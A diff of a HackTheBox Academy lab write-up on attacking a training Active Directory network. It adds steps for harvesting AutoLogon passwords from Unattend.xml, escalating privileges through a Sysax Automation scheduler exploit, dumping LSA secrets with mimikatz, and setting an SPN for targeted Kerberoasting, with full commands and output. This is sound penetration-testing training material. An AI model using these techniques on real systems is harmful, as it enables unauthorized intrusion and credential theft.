@@ -5,8 +5,6 @@ group: EnterpriseNetwork
 ![](https://academy.hackthebox.com/images/logo.svg)
 
 - Machine : https://academy.hackthebox.com/module/163
-- Reference : 
-- Solved : 2024.00.00. (Thu) (Takes 0days)
 
 
 # Summary
@@ -25,6 +23,8 @@ group: EnterpriseNetwork
 | 7   | Int     | backupadm     | !qazXSW@                          | plain | DC01          | SQL          | [Link](AEN.md#SMB%20share%20`Department%20Shares`%20on%20DC01) |
 | 8   | Int     | account       | L337^p@$$w0rD                     | plain | DC01          | Email        | [Link](AEN.md#SMB%20Share%20`SYSVOL`%20on%20DC01)              |
 | 9   | Int     | backupjob     | lucky7                            | plain | DC01          | SPN          | [Link](AEN.md#Kerberoasting)                                   |
+| 10  | Int     | ilfserveradm  | Sys26Admin                        | plain | MS01          | MS01         |                                                                |
+| 11  | Int     | mssqladm      | DBAilfreight1!                    | plain | MS01          | AD           | [Link](AEN.md#Credential%20dump%20`mssqladm`)                  |
 
 
 
@@ -3096,3 +3096,354 @@ I got a shell!
 
 ### Privilege Escalation ??
 
+```powershell
+*Evil-WinRM* PS C:\Users\backupadm\Documents> .\winPEASx64.exe
+
+<SNIP>
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  INLANEFREIGHT
+    DefaultUserName               :  mssqladm
+
+<SNIP> 
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files
+    C:\Windows\Panther\Unattend.xml
+
+<SNIP>
+```
+
+Two useful informations are found.
+- AutoLogon as `mssqladm` is enabled.
+- Unattend file is found.
+
+Let's see "AutoLogon as `mssqladm`" first.
+
+```powershell
+*Evil-WinRM* PS C:\Users\backupadm\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+
+
+
+reg.exe : ERROR: The system was unable to find the specified registry key or value.
+    + CategoryInfo          : NotSpecified: (ERROR: The syst...y key or value.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+```
+
+Can't find Registry path for now..
+
+Then, let's read `unattend.xml` file.
+
+```powershell
+*Evil-WinRM* PS C:\panther> type unattend.xml
+<?xml version="1.0" encoding="utf-8"?>
+<unattend xmlns="urn:schemas-microsoft-com:unattend">
+    <settings pass="oobeSystem">
+        <component name="Microsoft-Windows-International-Core" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+            <InputLocale>de-de</InputLocale>
+            <SystemLocale>de-de</SystemLocale>
+            <UILanguage>de-de</UILanguage>
+            <UILanguageFallback>de-de</UILanguageFallback>
+            <UserLocale>de-de</UserLocale>
+        </component>
+        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+            <OOBE>
+                <HideEULAPage>true</HideEULAPage>
+                <HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
+                <NetworkLocation>Work</NetworkLocation>
+                <ProtectYourPC>1</ProtectYourPC>
+            </OOBE>
+            <AutoLogon>
+                <Password>
+                    <Value>Sys26Admin</Value>
+                    <PlainText>true</PlainText>
+                </Password>
+                <Enabled>true</Enabled>
+                <LogonCount>1</LogonCount>
+                <Username>ilfserveradm</Username>
+            </AutoLogon>
+            <FirstLogonCommands>
+                <SynchronousCommand wcm:action="add">
+                    <CommandLine>C:\Windows\system32\net.exe user "Standard" /logonpasswordchg:yes</CommandLine>
+                    <Description>Force Password Reset for Standard account</Description>
+                    <Order>1</Order>
+                    <RequiresUserInput>false</RequiresUserInput>
+                </SynchronousCommand>
+                <SynchronousCommand wcm:action="add">
+                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoLogonSID /d "" /f</CommandLine>
+                    <Description>Clear Autologon SID</Description>
+                    <Order>2</Order>
+                    <RequiresUserInput>false</RequiresUserInput>
+                </SynchronousCommand>
+                <SynchronousCommand wcm:action="add">
+                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /d "Standard" /f</CommandLine>
+                    <Description>Select Standard account</Description>
+                    <Order>3</Order>
+                    <RequiresUserInput>false</RequiresUserInput>
+                </SynchronousCommand>
+                <SynchronousCommand wcm:action="add">
+                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v ForceUnlockLogon /d 0 /f /t REG_DWORD</CommandLine>
+                    <Description>Clear unlock</Description>
+                    <Order>4</Order>
+                    <RequiresUserInput>false</RequiresUserInput>
+                </SynchronousCommand>
+                <SynchronousCommand wcm:action="add">
+                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v ForceAutoLogon /d 0 /f /t REG_DWORD</CommandLine>
+                    <Description>Clear autologon</Description>
+                    <Order>5</Order>
+                    <RequiresUserInput>false</RequiresUserInput>
+                </SynchronousCommand>
+                <SynchronousCommand wcm:action="add">
+                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v IsConnectedAutoLogon /d 0 /f /t REG_DWORD</CommandLine>
+                    <Description>Clear isconnected</Description>
+                    <Order>6</Order>
+                    <RequiresUserInput>false</RequiresUserInput>
+                </SynchronousCommand>
+                <SynchronousCommand wcm:action="add">
+                    <CommandLine>reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 0 /f</CommandLine>
+                    <Description>Disable Autologon</Description>
+                    <Order>7</Order>
+                    <RequiresUserInput>false</RequiresUserInput>
+                </SynchronousCommand>
+                <SynchronousCommand wcm:action="add">
+                    <CommandLine>reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /f</CommandLine>
+                    <Description>Remove Autologon password</Description>
+                    <Order>8</Order>
+                    <RequiresUserInput>false</RequiresUserInput>
+                </SynchronousCommand>
+                <SynchronousCommand wcm:action="add">
+                    <CommandLine>shutdown /r /t 180</CommandLine>
+                    <Description>Restart computer after 180 seconds</Description>
+                    <Order>9</Order>
+                    <RequiresUserInput>false</RequiresUserInput>
+                </SynchronousCommand>
+            </FirstLogonCommands>
+            <UserAccounts>
+                <LocalAccounts>
+                    <LocalAccount wcm:action="add">
+                        <Password>
+                            <Value>Sys26Admin</Value>
+                            <PlainText>true</PlainText>
+                        </Password>
+                        <Description />
+                        <DisplayName />
+                        <Group>User</Group>
+                        <Name>ilfserveradm</Name>
+                    </LocalAccount>
+                </LocalAccounts>
+            </UserAccounts>
+            <TimeZone>W. Europe Standard Time</TimeZone>
+        </component>
+    </settings>
+    <settings pass="generalize">
+        <component name="Microsoft-Windows-PnpSysprep" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+            <DoNotCleanUpNonPresentDevices>true</DoNotCleanUpNonPresentDevices>
+            <PersistAllDeviceInstalls>true</PersistAllDeviceInstalls>
+        </component>
+    </settings>
+    <settings pass="specialize">
+        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+            <CopyProfile>true</CopyProfile>
+        </component>
+    </settings>
+</unattend>
+```
+
+**AutoLogon account** is found.
+- Username: `ilfserveradm`
+- Password: `Sys26Admin`
+
+Let's check this account.
+
+```powershell
+*Evil-WinRM* PS C:\panther> net user ilfserveradm /domain
+The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.
+
+net.exe : System error 5 has occurred.
+    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+Access is denied.
+
+
+*Evil-WinRM* PS C:\panther> net user ilfserveradm
+User name                    ilfserveradm
+Full Name                    ilfserveradm
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/1/2022 1:17:17 PM
+Password expires             Never
+Password changeable          6/1/2022 1:17:17 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   6/1/2022 1:17:17 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Desktop Users
+Global Group memberships     *None
+The command completed successfully.
+```
+
+The user `ilfserveradm` is not a domain user but local account.
+It belongs to `Remote Desktop Users` group!
+
+Let's open RDP using `xfreerdp`.
+
+### Exploit `sysaxautomation`
+
+This isn't a domain user, but it's interesting that this user has Remote Desktop access but is not a member of the local admins group. Let's RDP in and see what we can do. After RDPing in and performing additional enumeration, we find some non-standard software installed in the `C:\Program Files (x86)\SysaxAutomation` directory. A quick search yields [this](https://www.exploit-db.com/exploits/50834) local privilege escalation exploit. According to the write-up, this Sysax Scheduled Service runs as the local SYSTEM account and allows users to create and run backup jobs. If the option to run as a user is removed, it will default to running the task as the SYSTEM account. Let's test it out!
+
+First, create a file called `pwn.bat` in `C:\Users\ilfserveradm\Documents` containing the line `net localgroup administrators ilfserveradm /add` to add our user to the local admins group (sometime we'd need to clean up and note down in our report appendices). Next, we can perform the following steps:
+
+- Open `C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe`
+- Select `Setup Scheduled/Triggered Tasks`
+- Add task (Triggered)
+- Update folder to monitor to be `C:\Users\ilfserveradm\Documents`
+- Check `Run task if a file is added to the monitor folder or subfolder(s)`
+- Choose `Run any other Program` and choose `C:\Users\ilfserveradm\Documents\pwn.bat`
+- Uncheck `Login as the following user to run task`
+- Click `Finish` and then `Save`
+
+Finally, to trigger the task, create a new .txt file in the `C:\Users\ilfserveradm\Documents` directory. We can check and see that the `ilfserveradm` user was added to the `Administrators` group.
+
+```cmd
+C:\Users\ilfserveradm> net localgroup administrators
+
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+ilfserveradm
+INLANEFREIGHT\Domain Admins
+The command completed successfully.
+```
+
+### Credential dump `mssqladm`
+
+Next, we'll perform some post-exploitation on the MS01 host. We do see a couple of interesting files in the root of the c:\ drive named `budget_data.xlsx` and `Inlanefreight.kdbx` that would be worth looking into and potentially reporting to the client if they are not in their intended location. Next, we can use Mimikatz, elevate to an `NT AUTHORITY\SYSTEM` token and dump LSA secrets.
+
+```bash
+c:\Users\ilfserveradm\Documents> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # log
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::secrets
+Domain : ACADEMY-AEN-MS0
+SysKey : 61b3d49a6205a1dedb14591c22d36afc
+ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_RegOpenKeyEx (SECURITY) (0x00000005)
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+564     {0;000003e7} 1 D 30073          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;0136075a} 2 F 20322234    ACADEMY-AEN-MS0\ilfserveradm    S-1-5-21-1020326033-369054202-3290056218-1002   (14g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 20387820    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::secrets
+Domain : ACADEMY-AEN-MS0
+SysKey : 61b3d49a6205a1dedb14591c22d36afc
+
+Local name : ACADEMY-AEN-MS0 ( S-1-5-21-1020326033-369054202-3290056218 )
+Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
+Domain FQDN : INLANEFREIGHT.LOCAL
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {13764b01-b89c-8adf-69ec-8937ee43821e}
+  [00] {13764b01-b89c-8adf-69ec-8937ee43821e} 587be7dcfb75bb9ebb0c5c75cf4afb4488e602f9926f3404a09ecf8ba20b04e7
+
+Secret  : $MACHINE.ACC
+cur/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
+    NTLM:ced50a6f3cb256110200dcb022b32c12
+    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8
+old/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
+    NTLM:ced50a6f3cb256110200dcb022b32c12
+    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8
+
+Secret  : DefaultPassword
+cur/text: DBAilfreight1!
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 37 62 35 26 80 4c 6b 2f 11 ca 06 25 ab 97 21 3f 84 f8 74 fa bc 69 a1 c4 37 2b df f8 cd 6c 8f 0a 8a d9 67 e9 42 cf 4f 96
+    full: 37623526804c6b2f11ca0625ab97213f84f874fabc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
+    m/u : 37623526804c6b2f11ca0625ab97213f84f874fa / bc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
+old/hex : 01 00 00 00 51 9c 86 b4 cb dc 97 8b 35 9b c0 39 17 34 16 62 31 98 c1 07 ce 7d 9f 94 fc e7 2c d9 59 8a c6 07 10 78 7c 0d 9a 56 ce 0b
+    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
+    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
+
+Secret  : NL$KM
+cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
+old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
+```
+
+We find a set password but no associated username. This appears to be for an account configured with autologon, so we can query the Registry to find the username.
+
+```bash
+PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
+
+DefaultUserName : mssqladm
+PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+                  NT\CurrentVersion\Winlogon\
+PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+PSChildName     : Winlogon
+PSDrive         : HKLM
+PSProvider      : Microsoft.PowerShell.Core\Registry
+```
+
+Now we have a new credential pair: `mssqladm:DBAilfreight1!`.
+
+Before we move on, let's check for any other credentials. We see Firefox installed, so we can grab the [LaZagne tool](https://github.com/AlessandroZ/LaZagne) to try to dump any credentials saved in the browser. No luck, but always worth a check.
+
+### Privilege Escalation to `ttimmons` 
+
+By searching on `BloodHound`, I found out that the user `mssqladm` also belongs to AD domain.
+
+Let's check if the user has any outbound control.
+
+![](attachments/aen_50.png)
+
+The user `mssqladm` has `GenericWrite` permission on `ttimmons`.
+
+And this user has RDP permission to DEV01 machine.
+
+![](attachments/aen_51.png)
+
+Let's open a shell and try exploiting `GenericWrite`.
+Then, I created a SPN ticket using the following commands;
+
+```bash
+$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT.LOCAL\mssqladm', $SecPassword)
+
+Set-DomainObject -Identity ttimmons -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+```
+
+After that, I can get the SPN ticket using `impacket-GetUserSPNs`.
+
+> Stop here...
